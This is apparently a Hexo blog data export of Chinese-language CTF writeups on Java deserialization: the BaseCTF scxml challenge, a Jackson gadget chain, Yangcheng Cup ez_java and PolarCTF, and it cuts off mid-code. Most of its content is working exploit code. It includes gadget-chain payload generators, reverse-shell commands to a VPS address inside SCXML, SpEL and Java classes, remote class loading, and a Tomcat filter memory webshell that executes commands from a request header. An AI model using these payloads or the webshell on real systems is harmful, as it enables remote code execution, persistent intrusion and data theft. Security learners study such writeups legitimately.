{"meta":{"title":"Narcherの小窝","subtitle":"","description":"","author":"Narcher Alter","url":"http://example.com","root":"/"},"pages":[],"posts":[{"title":"BaseCTF2024_JAVA题解(一血)","slug":"BaseCTF2024_JAVA题解(一血)","date":"2024-09-15T13:07:42.752Z","updated":"2024-09-15T13:11:25.430Z","comments":true,"path":"2024/09/15/BaseCTF2024_JAVA题解(一血)/","link":"","permalink":"http://example.com/2024/09/15/BaseCTF2024_JAVA%E9%A2%98%E8%A7%A3(%E4%B8%80%E8%A1%80)/","excerpt":"作者：Narcher 时间：2024&#x2F;9&#x2F;13 分类：writeup","text":"作者：Narcher 时间：2024&#x2F;9&#x2F;13 分类：writeup [Fin] scxml前言 看见有java题没人做，于是便做了做，感觉还行，直到比赛结束只有三解 正文N1师傅的题，难度刚刚好 先下载附件看看： 有一个自定义的包n1ght.jar，打开分析一下： 自定义写了个类，并含有toString方法，再看看Main： 12345678910111213141516171819202122232425262728293031323334import com.sun.net.httpserver.HttpServer;import javax.naming.InitialContext;import java.io.IOException;public class Main &#123; public static void main(String[] args) throws IOException &#123; var port = Integer.parseInt(System.getenv().getOrDefault(&quot;PORT&quot;, &quot;8000&quot;)); var server = HttpServer.create(new java.net.InetSocketAddress(port), 0); server.createContext(&quot;/&quot;, req -&gt; &#123; var code = 200; var response = switch (req.getRequestURI().getPath()) &#123; case &quot;/scxml&quot; -&gt; &#123; try &#123; var param = req.getRequestURI().getQuery(); yield new java.io.ObjectInputStream(new java.io.ByteArrayInputStream(java.util.Base64.getDecoder().decode(param))).readObject().toString(); &#125; catch (Throwable e) &#123; e.printStackTrace(); yield &quot;:(&quot;; &#125; &#125; default -&gt; &#123; code = 404; yield &quot;Not found&quot;; &#125; &#125;; req.sendResponseHeaders(code, 0); var os = req.getResponseBody(); os.write(response.getBytes()); os.close(); &#125;); server.start(); System.out.printf(&quot;Server listening on :%s\\n&quot;, port); &#125;&#125; 发现在&#x2F;scxml路由下对查询的参数进行了Base64解密，并在反序列化后执行了toString方法，再联想到上边那个自定义包里的类，八成是用那个InvokerImpl类作为入口点，再结合下边的依赖以及题目名字，不难想到scxml的RCE漏洞：Apache SCXML2 RCE漏洞_scxml scxmlexecutor-CSDN博客 当然，我们还是回到上边继续跟题目来： InvokerImpl的构造器要求传入三个参数，第一个Invoker有点可疑，点进去看看： 发现是个接口，那么我们去找找它的实现类，结果发现只有一个SimpleSCXMLInvoker类，结合上边贴出来的那个漏洞，打就完了 因为InvokerImpl触发的是SimpleSCXMLInvoker类的invoke方法，我们看一下： 1234567891011121314151617181920212223242526272829303132333435363738public void invoke(String source, Map&lt;String, Object&gt; params) throws InvokerException &#123; SCXML scxml = null; try &#123; scxml = SCXMLReader.read(new URL(source)); &#125; catch (ModelException var9) &#123; throw new InvokerException(var9.getMessage(), var9.getCause()); &#125; catch (IOException var10) &#123; throw new InvokerException(var10.getMessage(), var10.getCause()); &#125; catch (XMLStreamException var11) &#123; throw new InvokerException(var11.getMessage(), var11.getCause()); &#125; Evaluator eval = this.parentSCInstance.getEvaluator(); this.executor = new SCXMLExecutor(eval, new SimpleDispatcher(), new SimpleErrorReporter()); Context rootCtx = eval.newContext((Context)null); Iterator var6 = params.entrySet().iterator(); while(var6.hasNext()) &#123; Map.Entry&lt;String, Object&gt; entry = (Map.Entry)var6.next(); rootCtx.setLocal((String)entry.getKey(), entry.getValue()); &#125; this.executor.setRootContext(rootCtx); this.executor.setStateMachine(scxml); this.executor.addListener(scxml, new SimpleSCXMLListener()); this.executor.registerInvokerClass(&quot;scxml&quot;, this.getClass()); try &#123; this.executor.go(); &#125; catch (ModelException var8) &#123; throw new InvokerException(var8.getMessage(), var8.getCause()); &#125; if (this.executor.getCurrentStatus().isFinal()) &#123; TriggerEvent te = new TriggerEvent(this.eventPrefix + invokeDone, 3); (new AsyncTrigger(this.parentSCInstance.getExecutor(), te)).start(); &#125;&#125; 很简单的逻辑，对我们传入的source进行URL查询后，解析所得的xml文件并执行，其实到this.executor.go();就结束了，之后注意一下前边调用到的参数都一一传参避免在前边报错就好了： 12345678910111213141516171819202122232425262728293031323334353637383940414243import com.n1ght.InvokerImpl;import org.apache.commons.scxml2.SCInstance;import org.apache.commons.scxml2.SCXMLExecutor;import org.apache.commons.scxml2.env.SimpleContext;import org.apache.commons.scxml2.env.SimpleErrorReporter;import org.apache.commons.scxml2.env.jexl.JexlEvaluator;import org.apache.commons.scxml2.invoke.SimpleSCXMLInvoker;import java.io.*;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.util.Base64;import java.util.HashMap;import java.util.Map;public class Test &#123; public static void main(String[] args) throws Exception &#123; SCXMLExecutor executor = new SCXMLExecutor(); executor.setRootContext(new SimpleContext()); executor.setEvaluator(new JexlEvaluator()); executor.setErrorReporter(new SimpleErrorReporter()); Class c = Class.forName(&quot;org.apache.commons.scxml2.SCInstance&quot;); Constructor constructor = c.getDeclaredConstructor(SCXMLExecutor.class); constructor.setAccessible(true); SCInstance scInstance = (SCInstance) constructor.newInstance(executor); setValue(scInstance,&quot;evaluator&quot;, new JexlEvaluator()); SimpleSCXMLInvoker simpleSCXMLInvoker = new SimpleSCXMLInvoker(); simpleSCXMLInvoker.setSCInstance(scInstance); Map&lt;String, Object&gt; params = new HashMap&lt;&gt;(); params.put(&quot;Narcher&quot;,&quot;Alter&quot;); InvokerImpl invoker = new InvokerImpl(simpleSCXMLInvoker,&quot;http://1.1.1.1:6666/scxml2.xml&quot;,params);//vps地址 ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(invoker); oos.close(); System.out.println(new String(Base64.getEncoder().encode(barr.toByteArray()))); &#125; public static void setValue(Object obj,String name,Object value)throws Exception &#123; Field field = obj.getClass().getDeclaredField(name); field.setAccessible(true); field.set(obj, value); &#125;&#125; 其中scxml2.xml内容如下（记得自己改vps地址）： 12345678910&lt;?xml version=&quot;1.0&quot;?&gt;&lt;scxml xmlns=&quot;http://www.w3.org/2005/07/scxml&quot; version=&quot;1.0&quot; initial=&quot;run&quot;&gt; &lt;state id=&quot;run&quot;&gt; &lt;onentry&gt; &lt;script&gt; &#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjEuMS4xLzc3NzcgMD4mMQo=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;) &lt;/script&gt; &lt;/onentry&gt; &lt;/state&gt;&lt;/scxml&gt; 之后用我上边的链子打就完了（记得url编码），下面附上图： 成功反弹shell并命令执行获得flag 小结本题的难度在于网上没有现成的payload，从头自己找一条链子对于大多数脚本小子来说可能有些难度，其次就是没注意到应该把链子放在传参的key上或者是在自己构造链子的时候各种地方漏了赋值等等，题目总的来说还挺好玩的 最后贴上一血：","categories":[],"tags":[]},{"title":"JAVA安全:Jackson链（未完待续）","slug":"JAVA安全Jackson链","date":"2024-08-30T03:18:25.970Z","updated":"2024-09-15T13:12:02.539Z","comments":true,"path":"2024/08/30/JAVA安全Jackson链/","link":"","permalink":"http://example.com/2024/08/30/JAVA%E5%AE%89%E5%85%A8Jackson%E9%93%BE/","excerpt":"作者：Narcher 时间：2024&#x2F;8&#x2F;30 分类：Vulnerability Analysis","text":"作者：Narcher 时间：2024&#x2F;8&#x2F;30 分类：Vulnerability Analysis 前言从网上看了几篇文章，讲的都挺好的，就写一篇做个总结吧 正文Spring-Jackson原生链这条链子是23年阿里云CTF bypassit1爆出来的 基本上依赖都是springboot自带的，硬要自己加的话就加下边这个： 12345&lt;dependency&gt; &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt; &lt;artifactId&gt;jackson-databind&lt;/artifactId&gt; &lt;version&gt;2.13.5&lt;/version&gt;&lt;/dependency&gt; 我们在正常调用jackson进行序列化的时候会自动调用序列化对象类的getter方法 1234567891011121314151617package jacksonimport com.fasterxml.jackson.core.JsonProcessingException;import com.fasterxml.jackson.databind.ObjectMapper;import jackson.bean.User;public class Test &#123; public static void main(String[] args) throws JsonProcessingException &#123; User user = new User(); System.out.println(user); ObjectMapper mapper = new ObjectMapper();// mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL); String jsonData = mapper.writeValueAsString(user); System.out.println(jsonData);// User user1 = mapper.readValue(jsonData,User.class);// System.out.println(user1); &#125;&#125; 其中User类内容如下： 123456789101112131415161718192021222324252627282930313233343536package jackson.bean;import java.util.Map;public class User &#123; private String name; private String age; public User() &#123; System.out.println(&quot;空构造器&quot;); &#125; public Map getGift() &#123; System.out.println(&quot;getGift&quot;); return null; &#125; public String getName() &#123; System.out.println(&quot;getName&quot;); return name; &#125; public void setName(String name) &#123; System.out.println(&quot;setName&quot;); this.name = name; &#125; public String getAge() &#123; System.out.println(&quot;getAge&quot;); return age; &#125; public void setAge(String age) &#123; System.out.println(&quot;setAge&quot;); this.age = age; &#125;&#125; 输出如下： 经过调试可以发现是writeValueAsString方法触发的： 而在jackson的库中有一个ArrayNode类，用于表示json数组，并且继承了BaseJsonNode类，而在BaseJsonNode类里对toString方法进行了重写： 相当于调用toString方法就可以导致任意getter的触发 对于可以利用的getter这里，不难想到最常见的TemplatesImpl类的getOutputProperties方法 那么把封装好的TemplatesImpl类放到ArrayNode里，然后再找一个能够触发toString方法且包含readObject方法的类就结束了 而在BadAttributeValueExpException的readObject方法中，则恰好有对toString方法的调用： 在学习CC链的时候我们就见过了，所以说直接用反射把val赋值成ArrayNode就完工了 但如果这样直接会发现在反序列化的时候根本弹不出计算器，反而是在序列化的时候会弹出来，报错显示在序列化的时候调用了BaseJsonNode的writeReplace方法： 而根据序列化的规则：writeReplace方法会在序列化的时候替换掉原有的类型，因此我们在反序列化的时候就不能按正常的逻辑打了 还好这是序列化过程中的，因此我们可以在序列化之前把这个方法给移掉，可以用javassist这个库 之后的完整链子如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051package jackson;import com.fasterxml.jackson.databind.ObjectMapper;import com.fasterxml.jackson.databind.node.ArrayNode;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import javassist.*;import javax.management.BadAttributeValueExpException;import java.io.*;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;public class jackson1 &#123; public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException, NotFoundException, CannotCompileException &#123; TemplatesImpl templates = new TemplatesImpl(); Class tc = templates.getClass(); Field nameField = tc.getDeclaredField(&quot;_name&quot;); nameField.setAccessible(true); nameField.set(templates,&quot;a&quot;); Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;); bytecodesField.setAccessible(true); byte[] code = Files.readAllBytes(Paths.get(&quot;C://Users//Narcher//IdeaProjects//evil.class&quot;)); byte[][] codes = &#123;code&#125;; bytecodesField.set(templates,codes); Field tfactoryField = tc.getDeclaredField(&quot;_tfactory&quot;); tfactoryField.setAccessible(true); tfactoryField.set(templates, new TransformerFactoryImpl()); ClassPool pool = ClassPool.getDefault(); CtClass ctClass0 = pool.get(&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;); CtMethod writeReplace = ctClass0.getDeclaredMethod(&quot;writeReplace&quot;); ctClass0.removeMethod(writeReplace); ctClass0.toClass(); ObjectMapper objectMapper = new ObjectMapper(); ArrayNode arrayNode = objectMapper.createArrayNode(); arrayNode.addPOJO(templates); BadAttributeValueExpException bad = new BadAttributeValueExpException(&quot;1&quot;); Field fval = BadAttributeValueExpException.class.getDeclaredField(&quot;val&quot;); fval.setAccessible(true); fval.set(bad,arrayNode); //序列化 ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\jackson1.txt&quot;)); oos.writeObject(bad); //反序列化 ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\jackson1.txt&quot;)); ois.readObject(); &#125;&#125; 而evil类如下： 123456789101112131415161718192021222324252627import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import java.io.IOException;public class evil extends AbstractTranslet &#123; static &#123; try&#123; Runtime.getRuntime().exec(&quot;calc&quot;); &#125;catch (IOException e)&#123; e.printStackTrace(); &#125; &#125; @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123; &#125; @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123; &#125;&#125;","categories":[],"tags":[]},{"title":"2024羊城杯ez_java题解","slug":"2024羊城杯ez_java题解","date":"2024-08-28T06:59:38.527Z","updated":"2024-08-28T11:58:26.425Z","comments":true,"path":"2024/08/28/2024羊城杯ez_java题解/","link":"","permalink":"http://example.com/2024/08/28/2024%E7%BE%8A%E5%9F%8E%E6%9D%AFez_java%E9%A2%98%E8%A7%A3/","excerpt":"作者：Narcher 时间：2024&#x2F;8&#x2F;28 分类：writeup","text":"作者：Narcher 时间：2024&#x2F;8&#x2F;28 分类：writeup 前言题目本身不难，但有很多小细节容易没注意到，写下来做警示吧 正文题目开启后，首页是个登录框： 下载下来附件之后反编译拿源码 注意到在config包下有shiro的身份验证的配置 不过没啥用，因为在User类里边给了我们用户名和密码 登录进去之后，会有一个文件上传： 我们看一下源码： 差不多就是防止直接上传jsp🐎的，除了这个之外，还有一个路由有点意思： 典型的反序列化，但自定义了个MyObjectInputStream类进行了过滤： 1private static final String[] blacklist = new String[]&#123;&quot;java.lang.Runtime&quot;, &quot;java.lang.ProcessBuilder&quot;, &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;, &quot;java.security.SignedObject&quot;, &quot;com.sun.jndi.ldap.LdapAttribute&quot;, &quot;org.apache.commons.beanutils&quot;, &quot;org.apache.commons.collections&quot;, &quot;javax.management.BadAttributeValueExpException&quot;, &quot;com.sun.org.apache.xpath.internal.objects.XString&quot;&#125;; 我们再去看看依赖： 有CB依赖，jackson依赖等等，因为有过滤，剩下能用的就剩个jackson依赖触发任意getter了，我们再去看看User类： 恰好有一个能利用的getter方法，里边是传统的URLClassLoader的远程类加载，可以加载.class或者.jar文件；还把http和file给禁用了，但它用的是startsWith禁用的，绕过方式有很多，比如在http或者file开头前加个url:或者jar:等等 例如：可以用jar:http://1.1.1.1:8888/evil.jar!/或者 url:http://1.1.1.1:8888/evil.jar远程加载jar；也可用url:http://1.1.1.1:8888/远程加载Evil.class 接下来要干的事情实际上很明确了：写一个恶意类，然后上传上去或者放vps上，然后远程类加载 恶意类我们就这样写： 123456789import java.io.IOException;import java.io.ObjectInputStream;import java.io.Serializable;public class Evil implements Serializable &#123; private void readObject(ObjectInputStream in) throws IOException &#123; Runtime.getRuntime().exec(&quot;bash -c &#123;echo,&lt;bash -i &gt;&amp; /dev/tcp/1.1.1.1/7777 0&gt;&amp;1的base64编码&gt;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;); &#125;&#125; 然后javac Evil.java编译成.class文件直接上传到vps上，或者使用命令jar -cvf evil.jar Evil.class把.class文件再次压缩成jar包，然后python起一个web服务就好了，剩下的就是远程类加载的链和触发链了： 因为BadAttributeValueExpException被禁用了，链子就用jackson链的改编： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657import com.example.ycbjava.bean.User;import com.example.ycbjava.utils.MyObjectInputStream;import com.fasterxml.jackson.databind.node.POJONode;import javassist.ClassPool;import javassist.CtClass;import javassist.CtMethod;import org.springframework.aop.framework.AdvisedSupport;import javax.swing.event.EventListenerList;import javax.swing.undo.CompoundEdit;import javax.swing.undo.UndoManager;import java.io.*;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Proxy;import java.util.Base64;import java.util.HashMap;import java.util.Vector;public class jackson &#123; public static void setValue(Object obj, String name, Object value) throws Exception&#123; Field field = obj.getClass().getDeclaredField(name); field.setAccessible(true); field.set(obj, value); &#125; public static void main(String[] args) throws Exception &#123; User user = new User(); user.setUsername(&quot;url:http://1.1.1.1:8888/&quot;); //注意更改vps地址 ClassPool pool = ClassPool.getDefault(); CtClass ctClass0 = pool.get(&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;); CtMethod writeReplace = ctClass0.getDeclaredMethod(&quot;writeReplace&quot;); ctClass0.removeMethod(writeReplace); ctClass0.toClass(); POJONode node = new POJONode(user); EventListenerList eventListenerList = new EventListenerList(); UndoManager undoManager = new UndoManager(); Field editsField = CompoundEdit.class.getDeclaredField(&quot;edits&quot;); editsField.setAccessible(true); Vector vector = (Vector) editsField.get(undoManager); vector.add(node); setValue(eventListenerList,&quot;listenerList&quot;,new Object[]&#123;InternalError.class, undoManager&#125;); HashMap hashMap = new HashMap(); hashMap.put(user,eventListenerList); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(hashMap); objectOutputStream.close(); byte[] serialize = byteArrayOutputStream.toByteArray(); System.out.println(Base64.getEncoder().encodeToString(serialize)); ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(byteArrayOutputStream.toByteArray())); objectInputStream.readObject(); &#125;&#125; 触发链就简单了，因为是反序列化触发，所以引一下就行了： 1234567Evil evil = new Evil();ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);objectOutputStream.writeObject(evil);objectOutputStream.close();byte[] serialize = byteArrayOutputStream.toByteArray();System.out.println(Base64.getEncoder().encodeToString(serialize)); 之后就挨个打就完了 ps：还有一点要注意的，这道题目的传参方式虽然是POST传参，但传统POST传参貌似只会报error，只能用multipart&#x2F;form-data的格式传参，这里也卡了我不少时间，需要注意一下 小结java题的细节很多，要多多注意","categories":[],"tags":[]},{"title":"PolarCTF靶场JAVA题全解（未完待续）","slug":"PolarCTF靶场JAVA题全解","date":"2024-08-24T13:57:54.028Z","updated":"2024-09-07T13:33:39.658Z","comments":true,"path":"2024/08/24/PolarCTF靶场JAVA题全解/","link":"","permalink":"http://example.com/2024/08/24/PolarCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/","excerpt":"作者：Narcher 时间：2024&#x2F;8&#x2F;25 分类：writeup","text":"作者：Narcher 时间：2024&#x2F;8&#x2F;25 分类：writeup ezjava题目提示flag在&#x2F;app&#x2F;flag.txt里，下完附件打开看一下 一眼SPEL表达式注入，直接打shell反弹：T(java.lang.Runtime).getRuntime().exec(&quot;bash -c &#123;echo,xxxxxxxxxxxxxxxxxxx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;) 结果发现机子不出网，于是只能改成直接读flag了：new java.io.BufferedReader(new java.io.InputStreamReader(new ProcessBuilder(new String[]&#123;&quot;bash&quot;,&quot;-c&quot;,&quot;cat /app/flag.txt&quot;&#125;).start().getInputStream(), &quot;gbk&quot;)).readLine() CB链下边是Controller 反序列化也没有什么过滤，但直接打CB链的话会发现机子不出网，因此只能打内存马（网上有些人写反弹shell成功的，不清楚怎么搞得，可能比赛的时候和靶场里的环境不一样？？？） 但直接打传统的内存马会发现打不进去，应该是payload太长了，被tomcat限制住了，下面学习一下官方的绕过手法 下边这个就是个纯的CB依赖打法的链子： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import org.apache.commons.beanutils.BeanComparator;import java.io.*;import java.lang.reflect.Field;import java.util.Base64;import java.util.PriorityQueue;public class EXP &#123; public static void main(String[] args) throws Exception &#123; final TemplatesImpl templates = createTemplatesImpl(MyClassLoader.class); // mock method name until armed final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER); // create queue with numbers and basic comparator final PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2, comparator); // stub data for replacement later queue.add(&quot;1&quot;); queue.add(&quot;1&quot;); // switch method called by comparator setFieldValue(comparator, &quot;property&quot;, &quot;outputProperties&quot;); // switch contents of queue final Object[] queueArray = (Object[]) getFieldValue(queue, &quot;queue&quot;); queueArray[0] = templates; queueArray[1] = templates; ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(queue); byte[] bytes = byteArrayOutputStream.toByteArray(); System.out.println(Base64.getEncoder().encodeToString(bytes)); &#125; public static &lt;T&gt; T createTemplatesImpl(Class c) throws Exception &#123; Class&lt;T&gt; tplClass = null; if (Boolean.parseBoolean(System.getProperty(&quot;properXalan&quot;, &quot;false&quot;))) &#123; tplClass = (Class&lt;T&gt;) Class.forName(&quot;org.apache.xalan.xsltc.trax.TemplatesImpl&quot;); &#125; else &#123; tplClass = (Class&lt;T&gt;) TemplatesImpl.class; &#125; final T templates = tplClass.newInstance(); final byte[] classBytes = classAsBytes(c); setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][]&#123; classBytes &#125;); setFieldValue(templates, &quot;_name&quot;, &quot;Pwnr&quot;); return templates; &#125; public static void setFieldValue(Object obj, String fieldName, Object fieldValue) throws NoSuchFieldException, IllegalAccessException &#123; Class clazz = obj.getClass(); Field classField = clazz.getDeclaredField(fieldName); classField.setAccessible(true); classField.set(obj, fieldValue); &#125; public static Object getFieldValue(Object obj, String fieldName) throws NoSuchFieldException, IllegalAccessException &#123; Class&lt;?&gt; clazz = obj.getClass(); Field classField = clazz.getDeclaredField(fieldName); classField.setAccessible(true); return classField.get(obj); &#125; public static byte[] classAsBytes(final Class&lt;?&gt; clazz) &#123; try &#123; final byte[] buffer = new byte[1024]; final String file = classAsFile(clazz); final InputStream in = clazz.getClassLoader().getResourceAsStream(file); if (in == null) &#123; throw new IOException(&quot;couldn&#x27;t find &#x27;&quot; + file + &quot;&#x27;&quot;); &#125; final ByteArrayOutputStream out = new ByteArrayOutputStream(); int len; while ((len = in.read(buffer)) != -1) &#123; out.write(buffer, 0, len); &#125; return out.toByteArray(); &#125; catch (IOException e) &#123; throw new RuntimeException(e); &#125; &#125; public static String classAsFile(final Class&lt;?&gt; clazz) &#123; return classAsFile(clazz, true); &#125; public static String classAsFile(final Class&lt;?&gt; clazz, boolean suffix) &#123; String str; if (clazz.getEnclosingClass() == null) &#123; str = clazz.getName().replace(&quot;.&quot;, &quot;/&quot;); &#125; else &#123; str = classAsFile(clazz.getEnclosingClass(), false) + &quot;$&quot; + clazz.getSimpleName(); &#125; if (suffix) &#123; str += &quot;.class&quot;; &#125; return str; &#125;&#125; 其中MyClassLoader类内容如下： 123456789101112131415161718192021222324252627282930313233import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import java.util.Base64;public class MyClassLoader extends AbstractTranslet &#123; static&#123; try&#123; javax.servlet.http.HttpServletRequest request = ((org.springframework.web.context.request.ServletRequestAttributes)org.springframework.web.context.request.RequestContextHolder.getRequestAttributes()).getRequest(); java.lang.reflect.Field r=request.getClass().getDeclaredField(&quot;request&quot;); r.setAccessible(true); org.apache.catalina.connector.Response response =((org.apache.catalina.connector.Request) r.get(request)).getResponse(); javax.servlet.http.HttpSession session = request.getSession(); String classData=request.getParameter(&quot;classData&quot;); System.out.println(&quot;classData:&quot;+classData); byte[] classBytes = Base64.getDecoder().decode(classData); java.lang.reflect.Method defineClassMethod = ClassLoader.class.getDeclaredMethod(&quot;defineClass&quot;,new Class[]&#123;byte[].class, int.class, int.class&#125;); defineClassMethod.setAccessible(true); Class cc = (Class) defineClassMethod.invoke(MyClassLoader.class.getClassLoader(), classBytes, 0,classBytes.length); cc.newInstance().equals(new Object[]&#123;request,response,session&#125;); &#125;catch(Exception e)&#123; e.printStackTrace(); &#125; &#125; public void transform(DOM arg0, SerializationHandler[] arg1) throws TransletException &#123; &#125; public void transform(DOM arg0, DTMAxisIterator arg1, SerializationHandler arg2) throws TransletException &#123; &#125;&#125; 大体意思就是获取请求之后，加载classData传进来的类，并把请求会话这种直接当作参数传给内存马 在传参user&#x3D;EXP的输出(URL编码)的同时，传参classData&#x3D;下边内存马的base64编码(同样也urlencode了一下)： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687import javax.servlet.*;import java.io.BufferedReader;import java.io.IOException;import java.io.InputStream;import java.io.InputStreamReader;import java.util.stream.Collectors;public class FilterMem implements javax.servlet.Filter&#123; private javax.servlet.http.HttpServletRequest request = null; private org.apache.catalina.connector.Response response = null; private javax.servlet.http.HttpSession session =null; @Override public void init(FilterConfig filterConfig) throws ServletException &#123; &#125; public void destroy() &#123;&#125; @Override public void doFilter(ServletRequest request1, ServletResponse response1, FilterChain filterChain) throws IOException, ServletException &#123; javax.servlet.http.HttpServletRequest request = (javax.servlet.http.HttpServletRequest)request1; javax.servlet.http.HttpServletResponse response = (javax.servlet.http.HttpServletResponse)response1; javax.servlet.http.HttpSession session = request.getSession(); String cmd = request.getHeader(&quot;Polar-CMD&quot;); System.out.println(cmd); if (cmd != null) &#123; //System.out.println(&quot;1&quot;); response.setHeader(&quot;Polar-START&quot;, &quot;OK&quot;); // 使用 ProcessBuilder 执行命令 Process process = new ProcessBuilder(cmd.split(&quot;\\\\s+&quot;)) .redirectErrorStream(true) .start(); //System.out.println(&quot;2&quot;); // 获取命令执行的输入流 InputStream inputStream = process.getInputStream(); // 使用 Java 8 Stream 将输入流转换为字符串 String result = new BufferedReader(new InputStreamReader(inputStream)) .lines() .collect(Collectors.joining(System.lineSeparator())); System.out.println(&quot;3&quot;); response.setHeader(&quot;Polar-RESULT&quot;,result); &#125; else &#123; filterChain.doFilter(request, response); &#125; &#125; public boolean equals(Object obj) &#123; Object[] context=(Object[]) obj; this.session = (javax.servlet.http.HttpSession ) context[2]; this.response = (org.apache.catalina.connector.Response) context[1]; this.request = (javax.servlet.http.HttpServletRequest) context[0]; try &#123; dynamicAddFilter(new FilterMem(),&quot;Shell&quot;,&quot;/*&quot;,request); &#125; catch (IllegalAccessException e) &#123; e.printStackTrace(); &#125; return true; &#125; public static void dynamicAddFilter(javax.servlet.Filter filter,String name,String url,javax.servlet.http.HttpServletRequest request) throws IllegalAccessException &#123; javax.servlet.ServletContext servletContext=request.getServletContext(); if (servletContext.getFilterRegistration(name) == null) &#123; java.lang.reflect.Field contextField = null; org.apache.catalina.core.ApplicationContext applicationContext =null; org.apache.catalina.core.StandardContext standardContext=null; java.lang.reflect.Field stateField=null; javax.servlet.FilterRegistration.Dynamic filterRegistration =null; try &#123; contextField=servletContext.getClass().getDeclaredField(&quot;context&quot;); contextField.setAccessible(true); applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(servletContext); contextField=applicationContext.getClass().getDeclaredField(&quot;context&quot;); contextField.setAccessible(true); standardContext= (org.apache.catalina.core.StandardContext) contextField.get(applicationContext); stateField=org.apache.catalina.util.LifecycleBase.class.getDeclaredField(&quot;state&quot;); stateField.setAccessible(true); stateField.set(standardContext,org.apache.catalina.LifecycleState.STARTING_PREP); filterRegistration = servletContext.addFilter(name, filter); filterRegistration.addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), false,new String[]&#123;url&#125;); java.lang.reflect.Method filterStartMethod = org.apache.catalina.core.StandardContext.class.getMethod(&quot;filterStart&quot;); filterStartMethod.setAccessible(true); filterStartMethod.invoke(standardContext, null); stateField.set(standardContext,org.apache.catalina.LifecycleState.STARTED); &#125;catch (Exception e)&#123; &#125;finally &#123; stateField.set(standardContext,org.apache.catalina.LifecycleState.STARTED); &#125; &#125; &#125;&#125; 上边这个就是个普通的tomcat的filter内存马 为了方便截图我把user的内容删了一部分，下边的图仅是传参示例： 之后从HTTP header中设置命令就好了： PolarOA进去是个登录框 随便输一输抓包看看： 一眼shiro 直接上工具梭哈 构造链这里似乎爆破的有点问题，有点怪，爆破不出来，还不给源码，我怎么知道CB依赖是什么版本的，下边是出题人的解释： 之后我去看了看之前自己搭的shiro 1.2.4的版本，发现确实自带的CB依赖就是1.8.3版本的，可能是个小trick吧，那么打纯CB依赖就好了，上边CB链那个题先拿过来试一试，发现也是长了，那就先打一下出网吧，结果打完发现不出网 先把马贴出来吧： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677package shiropoc;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import javassist.*;import java.io.IOException;public class DynamicClassGenerator &#123; public CtClass genPayloadForWin() throws NotFoundException, CannotCompileException, IOException &#123; ClassPool classPool = ClassPool.getDefault(); CtClass clazz = classPool.makeClass(&quot;Exp&quot;); if ((clazz.getDeclaredConstructors()).length != 0) &#123; clazz.removeConstructor(clazz.getDeclaredConstructors()[0]); &#125; clazz.addConstructor(CtNewConstructor.make(&quot;public SpringEcho() throws Exception &#123;\\n&quot; + &quot; try &#123;\\n&quot; + &quot; org.springframework.web.context.request.RequestAttributes requestAttributes = 